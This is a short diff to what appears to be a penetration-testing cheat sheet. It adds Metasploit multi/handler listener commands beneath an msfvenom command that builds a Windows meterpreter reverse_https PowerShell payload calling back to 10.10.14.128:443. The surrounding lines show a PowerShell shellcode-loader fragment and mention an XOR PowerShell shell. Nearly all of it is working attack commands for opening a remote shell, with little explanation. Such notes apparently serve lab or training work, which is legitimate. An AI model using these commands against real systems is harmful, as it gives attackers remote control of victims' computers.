@@ -68,6 +68,10 @@ $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((
 Generate a payload:
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.128 LPORT=443 -f ps1
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
 ```
 Powershell XOR shell (`pwsh` on kali will drop you to a powershell and can run the script)
 ```
